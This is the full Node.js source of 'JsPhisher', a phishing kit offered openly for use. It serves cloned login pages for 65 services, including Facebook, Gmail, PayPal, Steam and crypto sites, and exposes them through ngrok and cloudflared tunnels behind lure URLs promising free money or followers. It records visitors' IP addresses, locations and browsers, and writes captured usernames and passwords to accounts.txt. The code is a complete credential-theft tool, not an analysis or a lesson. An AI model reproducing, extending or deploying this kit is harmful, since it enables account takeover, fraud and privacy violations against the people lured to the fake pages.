/**
 * JsPhisher - Easy phishing tool
 * Coded by: @gamerboytr
 * License: GPL-3.0
 * Its a open-source project
 * Please report any bugs to: https://github.com/gamerboytr/JsPhisher/issues
 */

"use strict";
try {
	require("body-parser");
} catch (e) {
	console.clear();
	if (e.code !== "MODULE_NOT_FOUND") {
		throw e;
	}
	console.log("You don't have node_modules installed.");
	console.log("Installing dependencies...");
	require("child_process").execSync("npm install");
	console.log("Installed all dependencies.");
}
const express = require("express");
const bodyParser = require("body-parser");
const readlineSync = require("readline-sync");
const geoip = require("geoip-lite");
const chalk = require("chalk");
const agentParser = require("ua-parser-js");
const child_process = require("child_process");
const downloader = require("download");
const AdmZip = require("adm-zip");
const axios = require("axios").default;
const app = express();
const port = process.env.PORT || process.env.NODE_PORT || 6969;
const short = require("./short");
const path = require("path");
const fs = require("fs");

const VERSION = "1.3";
const isTermux = process.platform === "android";
const isLinux = process.platform === "linux" || isTermux;
const logAsk = chalk.greenBright`[{whiteBright ?}]`;
const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
const logError = chalk.redBright`[{whiteBright !}]`;
const logInfo = chalk.yellowBright`[{whiteBright +}]`;
const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;

const logLogo =
	chalk.red`       _     _____  _     _     _               \n` +
	chalk.cyan`      | |   |  __ \\| |   (_)   | |              \n` +
	chalk.yellow`      | |___| |__) | |__  _ ___| |__   ___ _ __ \n` +
	chalk.blue`  _   | / __|  ___/| '_ \\| / __| '_ \\ / _ \\ '__|\n` +
	chalk.red` | |__| \\__ \\ |    | | | | \\__ \\ | | |  __/ |   \n` +
	chalk.yellow`  \\____/|___/_|    |_| |_|_|___/_| |_|\\___|_|\n` +
	chalk.cyan`				       [v${VERSION}]	  \n` +
	chalk.red`			      [By GamerboyTR]	  \n`;

console.clear();
console.log(logLogo);
const availableSites = [
	"Facebook Traditional",
	"Facebook Voting",
	"Facebook Security",
	"Messenger",
	"Instagram Traditional",
	"Insta Auto Followers",
	"Insta 1000 Followers",
	"Insta Blue Verify",
	"Gmail Old",
	"Gmail New",
	"Gmail Poll",
	"Microsoft",
	"Netflix",
	"Paypal",
	"Steam",
	"Twitter",
	"PlayStation",
	"TikTok",
	"Twitch",
	"Pinterest",
	"SnapChat",
	"LinkedIn",
	"Ebay",
	"Quora",
	"Protonmail",
	"Spotify",
	"Reddit",
	"Adobe",
	"DevianArt",
	"Badoo",
	"Clash Of Clans",
	"Ajio",
	"JioRouter",
	"FreeFire",
	"Pubg",
	"Telegram",
	"Youtube",
	"Airtel",
	"SocialClub",
	"Ola",
	"Outlook",
	"Amazon",
	"Origin",
	"DropBox",
	"Yahoo",
	"WordPress",
	"Yandex",
	"StackOverflow",
	"VK",
	"VK Poll",
	"Xbox",
	"Mediafire",
	"Gitlab",
	"Github",
	"Apple",
	"iCloud",
	"Shopify",
	"Myspace",
	"Shopping",
	"Cryptocurrency",
	"SnapChat2",
	"Verizon",
	"Wi-Fi",
	"Discord",
	"Roblox",
];
const loggedIps = [];
if (process.platform === "darwin") {
	console.log(chalk.redBright`${logError} You are running on a Mac. This is not supported.`);
	process.exit(1);
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "bin", "instagram")));
app.disable("x-powered-by");

(async () => {
	await controlVersion().catch(throwError);
	await installRequirements().catch(throwError);
	const selectedSite = await selectSite().catch(throwError);
	console.clear();
	console.log(logLogo);
	if (isTermux) {
		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
		await new Promise(r => setTimeout(r, 1000));
	}
	console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
	await new Promise(r =>
		app.listen(port, _ => {
			console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
			r();
		})
	);
	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
	const ngrok = await openNgrok(port).catch(throwError);
	const shortNgrok = await short(ngrok).catch(throwError);
	const cloudflared = !isTermux ? await openCloudflared(port).catch(throwError) : null;
	const shortCf = !isTermux ? await short(cloudflared).catch(throwError) : null;
	if (!isTermux) {
		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${selectedSite.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
	}
	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${selectedSite.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
	if (process.platform === "win32") {
		require("readline")
			.createInterface({ input: process.stdin, output: process.stdout })
			.on("SIGINT", () => process.emit("SIGINT"));
	}
	process.on("SIGINT", onExit);
})();

app.all("/", async (req, res) => {
	const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
	const userAgent = req.headers["user-agent"];
	const ua = agentParser(userAgent);
	const referer = req.headers?.referer;
	const location = geoip.lookup(ip);
	const { data: request } = await axios.get(`https://ipwhois.app/json/${ip}`).catch(throwError);
	res.redirect("login");
	if (ip !== "::1" && !botDetecter.test(userAgent) && !loggedIps.includes(ip) && request.type && location?.city) {
		console.clear();
		console.log(logLogo);
		console.log(chalk.greenBright`${logSuccess} Victim IP found!\n`);

		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP                   :  ${ip}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP Type              :  ${request.type}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User OS              :  ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Browser              :  ${ua.browser.name ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Version              :  ${ua.browser.version ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Location             :  ${request?.city ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} GeoLocation(lat, lon):  ${location.ll.join(", ")}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Curreny              :  ${request.currency_code}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Referer              :  ${referer ?? "No referer"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} UserAgent            :  ${userAgent ?? "No agent"}\n`);

		loggedIps.push(ip);
		fs.appendFileSync("./ip.txt", `${ip} - ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"} - ${ua.browser.name ?? "Unknown"}${" " + ua.browser.version ?? ""} - ${location?.city ?? "Unknown"} - ${location.ll.join(", ")} - ${referer ?? "No referer"}\n`);
		console.log(chalk.cyan`${logInfo} Saved in ip.txt\n`);
		console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
	}
});

app.post(["/login", "/login.php"], (req, res) => {
	const { username, password } = req.body;
	if (!username?.trim?.() || !password?.trim?.()) {
		res.redirect("/login");
		return;
	}
	res.redirect("https://www.google.com/search?q=How+can+I+get+my+stolen+account+back+%3B%29");
	console.log(chalk.greenBright`${logSuccess} Victim login info found!\n`);

	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User Username:  ${username}`);
	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User Password:  ${password}\n`);

	fs.appendFileSync("./accounts.txt", `${username}:${password}\n`);
	console.log(chalk.cyan`${logInfo} Saved in accounts.txt\n`);
	console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
});

//! Functions

function controlVersion() {
	return new Promise(async (resolve, reject) => {
		const { data: readme } = await axios.get("https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/README.md").catch(reject);
		const version = readme.match(/Version-(.*?)-green/)[1];
		const changelogRequest = await axios.get(`https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/CHANGELOG.md`).catch(() => {});
		const changelog = changelogRequest?.data;
		if (version !== VERSION) {
			console.clear();
			console.log(logLogo);
			console.log(chalk.redBright`${logError} New version available!\n`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Current version:  ${VERSION}`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} New version:      ${version}\n`);
			console.log(chalk.yellow`${logAsk} Do you want to update? {yellowBright (y/n)}`);
			if (readlineSync.keyInYN("")) {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Updating...\n`);
				console.log(chalk.yellow`${logInfo} Downloading repo...`);
				const currentDir = process.cwd().replaceAll("\\", "/").split("/")[process.cwd().replaceAll("\\", "/").split("/").length - 2];
				child_process.execSync(`cd ../.. && ${isLinux ? `rm -rf ${currentDir}` : `rmdir /S /Q ${currentDir}`} && git clone https://github.com/gamerboytr/JsPhisher`);
				console.log(chalk.yellow`${logInfo} Updated!\n`);
				console.log(chalk.yellow`${logInfo} Please restart terminal manually.\n`);
				if (changelog) {
					console.log(chalk.yellow`${logInfo} Changelog:\n`);
					console.log(chalk.yellow(changelog));
				}
				process.exit();
			} else {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Using old version.\n`);
			}
		}
		resolve();
	});
}

function getArch() {
	let arch = process.arch;
	if (isLinux) {
		if (arch === "x64") {
			arch = "amd64";
		} else if (arch === "x32") {
			arch = "amd";
		}
	} else {
		if (arch === "x32") {
			arch = "386";
		}
	}
	return arch;
}

function installRequirements() {
	return new Promise(async (resolve, reject) => {
		console.clear();
		console.log(logLogo);
		//! Cloudflared
		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
			const cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? `linux-${getArch()}.deb` : "windows-386.exe"}`;
			try {
				await downloader(cloudflaredLink, path.join(__dirname, "bin"), { filename: `cloudflared${!isLinux ? ".exe" : ""}` }).catch(reject);
				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
				if (isLinux) {
					child_process.execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
				}
			} catch {
				console.log(chalk.redBright`${logError} Failed to download cloudflared!\n`);
				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
			}
		}
		//! Ngrok
		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
			console.log(chalk.yellow`${logInfo2} Downloading ngrok...`);
			const ngrokLink = `https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-${isLinux ? `linux-${getArch()}.tgz` : "windows-386.zip"}`;
			try {
				await downloader(ngrokLink, path.join(__dirname, "bin"), { filename: `ngrok${isLinux ? ".tgz" : ".zip"}` }).catch(reject);
				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
				console.log(chalk.yellow`${logInfo2} Extracting...`);
				if (isLinux) {
					child_process.execSync(`tar -xvf ${path.join(__dirname, "bin", "ngrok.tgz")} -C ${path.join(__dirname, "bin")}`);
					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.tgz"));
				} else {
					new AdmZip(path.join(__dirname, "bin", "ngrok.zip")).extractAllTo(path.join(__dirname, "bin"));
					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.zip"));
				}
				console.log(chalk.yellow`${logSuccess} Extracted!\n`);
			} catch {
				console.log(chalk.redBright`${logError} Failed to download ngrok!\n`);
				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
			}
		}
		resolve();
	});
}

function openNgrok(port) {
	return new Promise(async (resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
			return reject("Cannot found ngrok!");
		}
		child_process.spawn("bin/ngrok", ["http", port]);
		await new Promise(r => setTimeout(r, 3000));
		let ngrokUrl;
		while (!ngrokUrl) {
			try {
				let request = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
				if (request?.data?.tunnels?.[0]?.public_url) {
					ngrokUrl = (request.data.tunnels?.[1] ?? request.data.tunnels?.[0]).public_url;
				} else {
					await new Promise(r => setTimeout(r, 1000));
				}
			} catch (e) {
				return reject("Failed to start ngrok, please try again : " + e);
			}
		}
		resolve(ngrokUrl);
	});
}

function openCloudflared(port) {
	return new Promise((resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
			return reject("Cannot found cloudlfared!");
		}
		if (isTermux) {
			return reject("Cloudflared is not supported on Termux");
		}
		let cfUrl;
		let cfShowed = false;
		let cfReady = false;
		child_process.spawn("bin/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]).stderr.on("data", data => {
			if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) {
				cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
			}
			cfReady = !!data.toString().match(/Connection (.*) registered/);
			if (cfReady && !cfShowed) {
				cfShowed = true;
				resolve(cfUrl[0]);
			}
		});
	});
}

function onExit(withoutLog = false) {
	if (!withoutLog) {
		console.log(chalk.yellowBright`\n${logInfo2} Thanks for using JsPhisher!\n`);
	}
	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line").catch(() => {});
	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line%20%28http%29").catch(() => {}); //! For HTTPS
	process.exit();
}

function throwError(error) {
	console.log(chalk.redBright`${logError} ${error}\n`);
	onExit(true);
}

function selectSite() {
	return new Promise(async (resolve, reject) => {
		availableSites.forEach((site, index) => {
			const maxLength = Math.max(...availableSites.map(s => s.length)) + 10;
			let spacing = " ".repeat(maxLength);
			spacing = spacing.substring(0, maxLength - site.length);
			spacing = ((index + 1) / 3) % 1 === 0 ? "\n" : spacing;
			process.stdout.write(chalk.yellowBright`{greenBright [}{whiteBright ${index + 1 < 10 ? "0" + (index + 1) : index + 1}}{greenBright ]} ${site}${spacing}`);
		});
		console.log(chalk.yellowBright`\n\n{greenBright [}{whiteBright 0}{greenBright ]} Exit\n`);
		const choose = readlineSync.prompt({ prompt: chalk.yellowBright`${logAsk} Select one of the options > ` });
		let folder;
		let mask;
		if (choose == "1" || choose == "01") {
			folder = "facebook";
			mask = "https://blue-verified-facebook-free";
		} else if (choose === "2" || choose == "02") {
			folder = "fb_advanced";
			mask = "https://vote-for-the-best-social-media";
		} else if (choose === "3" || choose == "03") {
			folder = "fb_security";
			mask = "https://make-your-facebook-secured-and-free-from-hackers";
		} else if (choose === "4" || choose == "04") {
			folder = "fb_messenger";
			mask = "https://get-messenger-premium-features-free";
		} else if (choose === "5" || choose == "05") {
			folder = "instagram";
			mask = "https://get-unlimited-followers-for-instagram";
		} else if (choose === "6" || choose == "06") {
			folder = "ig_followers";
			mask = "https://get-unlimited-followers-for-instagram";
		} else if (choose === "7" || choose == "07") {
			folder = "insta_followers";
			mask = "https://get-1000-followers-for-instagram";
		} else if (choose === "8" || choose == "08") {
			folder = "ig_verify";
			mask = "https://blue-badge-verify-for-instagram-free";
		} else if (choose === "9" || choose == "09") {
			folder = "google";
			mask = "https://get-unlimited-google-drive-free";
		} else if (choose === "10") {
			folder = "google_new";
			mask = "https://get-unlimited-google-drive-free";
		} else if (choose === "11") {
			folder = "google_poll";
			mask = "https://vote-for-the-best-social-media";
		} else if (choose === "12") {
			folder = "microsoft";
			mask = "https://unlimited-onedrive-space-for-free";
		} else if (choose === "13") {
			folder = "netflix";
			mask = "https://upgrade-your-netflix-plan-free";
		} else if (choose === "14") {
			folder = "paypal";
			mask = "https://get-500-usd-free-to-your-account";
		} else if (choose === "15") {
			folder = "steam";
			mask = "https://steam-500-usd-gift-card-free";
		} else if (choose === "16") {
			folder = "twitter";
			mask = "https://get-blue-badge-on-twitter-free";
		} else if (choose === "17") {
			folder = "playstation";
			mask = "https://playstation-500-usd-gift-card-free";
		} else if (choose === "18") {
			folder = "tiktok";
			mask = "https://tiktok-free-liker";
		} else if (choose === "19") {
			folder = "twitch";
			mask = "https://unlimited-twitch-tv-user-for-free";
		} else if (choose === "20") {
			folder = "pinterest";
			mask = "https://get-a-premium-plan-for-pinterest-free";
		} else if (choose === "21") {
			folder = "snapchat";
			mask = "https://view-locked-snapchat-accounts-secretly";
		} else if (choose === "22") {
			folder = "linkedin";
			mask = "https://get-a-premium-plan-for-linkedin-free";
		} else if (choose === "23") {
			folder = "ebay";
			mask = "https://get-500-usd-free-to-your-account";
		} else if (choose === "24") {
			folder = "quora";
			mask = "https://quora-premium-for-free";
		} else if (choose === "25") {
			folder = "protonmail";
			mask = "https://protonmail-pro-basics-for-free";
		} else if (choose === "26") {
			folder = "spotify";
			mask = "https://convert-your-account-to-spotify-premium";
		} else if (choose === "27") {
			folder = "reddit";
			mask = "https://reddit-official-verified-member-badge";
		} else if (choose === "28") {
			folder = "adobe";
			mask = "https://get-adobe-lifetime-pro-membership-free";
		} else if (choose === "29") {
			folder = "deviantart";
			mask = "https://get-500-usd-free-to-your-acount";
		} else if (choose === "30") {
			folder = "badoo";
			mask = "https://get-500-usd-free-to-your-acount";
		} else if (choose === "31") {
			folder = "clashofclans";
			mask = "https://get-unlimited-gems-in-your-coc-account";
		} else if (choose === "32") {
			folder = "ajio";
			mask = "https://get-limited-time-discount";
		} else if (choose === "33") {
			folder = "jiorouter";
			mask = "https://get-premium-membership-free";
		} else if (choose === "34") {
			folder = "freefire";
			mask = "https://get-unlimited-diamonds-in-your-ff-account";
		} else if (choose === "35") {
			folder = "pubg";
			mask = "https://get-unlimited-diamonds-in-your-pubg-account";
		} else if (choose === "36") {
			folder = "telegram";
			mask = "https://get-premium-membership-free";
		} else if (choose === "37") {
			folder = "youtube";
			mask = "https://get-1k-like-in-any-video";
		} else if (choose === "38") {
			folder = "airtelsim";
			mask = "https://get-500-cureency-free-to-your-account";
		} else if (choose === "39") {
			folder = "socialclub";
			mask = "https://get-premium-membership-free";
		} else if (choose === "40") {
			folder = "ola";
			mask = "https://book-a-cab-in-discount";
		} else if (choose === "41") {
			folder = "outlook";
			mask = "https://grab-mail-from-anyother-outlook-account-free";
		} else if (choose === "42") {
			folder = "amazon";
			mask = "https://get-limited-time-discount-free";
		} else if (choose === "43") {
			folder = "origin";
			mask = "https://get-500-usd-free-to-your-acount";
		} else if (choose === "44") {
			folder = "dropbox";
			mask = "https://get-1TB-cloud-storage-free";
		} else if (choose === "45") {
			folder = "yahoo";
			mask = "https://grab-mail-from-anyother-yahoo-account-free";
		} else if (choose === "46") {
			folder = "wordpress";
			mask = "https://unlimited-wordpress-traffic-free";
		} else if (choose === "47") {
			folder = "yandex";
			mask = "https://grab-mail-from-anyother-yandex-account-free";
		} else if (choose === "48") {
			folder = "stackoverflow";
			mask = "https://get-stackoverflow-lifetime-pro-membership-free";
		} else if (choose === "49") {
			folder = "vk";
			mask = "https://vk-premium-real-method-2020";
		} else if (choose === "50") {
			folder = "vk_pole";
			mask = "https://vote-for-the-best-social-media";
		} else if (choose === "51") {
			folder = "xbox";
			mask = "https://get-500-usd-free-to-your-acount";
		} else if (choose === "52") {
			folder = "mediafire";
			mask = "https://get-1TB-on-mediafire-free";
		} else if (choose === "53") {
			folder = "gitlab";
			mask = "https://get-1k-followers-on-gitlab-free";
		} else if (choose === "54") {
			folder = "github";
			mask = "https://get-1k-followers-on-github-free";
		} else if (choose === "55") {
			folder = "apple";
			mask = "https://get-apple-premium-account-free";
		} else if (choose === "56") {
			folder = "icloud";
			mask = "https://unlimited-storage-icloud-free";
		} else if (choose === "57") {
			folder = "shopify";
			mask = "https://get-50%-discount-on-any-sale";
		} else if (choose === "58") {
			folder = "myspace";
			mask = "https://get-1k-followers-on-myspace-free-free";
		} else if (choose === "59") {
			folder = "shopping";
			mask = "https://get-50%-discount-on-any-sale";
		} else if (choose === "60") {
			folder = "cryptocurrency";
			mask = "https://get-bitcoins-free";
		} else if (choose === "61") {
			folder = "snapchat2";
			mask = "https://view-locked-snapchat-accounts-secretly";
		} else if (choose === "62") {
			folder = "verizon";
			mask = "https://get-verizon-premium-account-free";
		} else if (choose === "63") {
			folder = "wifi";
			mask = "https://reconnect-your-wifi";
		} else if (choose === "64") {
			folder = "discord";
			mask = "https://security-bot-for-your-discord-free";
		} else if (choose === "65") {
			folder = "roblox";
			mask = "https://play-premium-games-for-free";
		} else if (choose == "0") {
			onExit(true);
		} else {
			console.clear();
			console.log(chalk.redBright`${logError} Invalid input.`);
			selectSite();
			return;
		}
		await downloadSites(folder);
		resolve({ site: folder, mask });
		app.get("/login", (_req, res) => {
			res.sendFile(path.join(__dirname, "bin", "websites", folder, "login.html"));
		});
	});
}

function downloadSites(folder) {
	return new Promise(async resolve => {
		if (!fs.existsSync(path.join(__dirname, "bin", "websites", folder))) {
			console.log(chalk.yellowBright(`${logInfo} Downloading required files...`));
			try {
				if (!fs.existsSync(path.join(__dirname, "bin", "websites"))) {
					console.log(chalk.yellowBright(`${logInfo} Creating folder...`));
					fs.mkdirSync(path.join(__dirname, "bin", "websites"));
				}
				fs.writeFileSync(path.join(__dirname, "bin", "websites", folder + ".zip"), await downloader(`https://github.com/KasRoudra/files/raw/main/phishingsites/${folder}.zip`).catch(throwError));
				console.log(chalk.greenBright(`${logSuccess} Downloaded successfully.`));
				console.log(chalk.yellowBright(`${logInfo} Extracting files...`));
				new AdmZip(path.join(__dirname, "bin", "websites", folder + ".zip")).extractAllTo(path.join(__dirname, "bin", "websites", folder), true);
				console.log(chalk.greenBright(`${logSuccess} Extracted successfully.`));
				console.log(chalk.yellowBright(`${logInfo} Deleting unnecessary files...`));
				fs.unlinkSync(path.join(__dirname, "bin", "websites", folder + ".zip"));
				fs.readdirSync(path.join(__dirname, "bin", "websites", folder)).forEach(file => {
					if (!file.endsWith(".php")) {
						return;
					}
					fs.unlinkSync(path.join(__dirname, "bin", "websites", folder, file));
				});
				console.log(chalk.greenBright(`${logSuccess} Deleted successfully.`));
			} catch (error) {
				console.log(chalk.redBright(`${logError} ${error}`));
				onExit(true);
			}
		}
		resolve();
	});
}
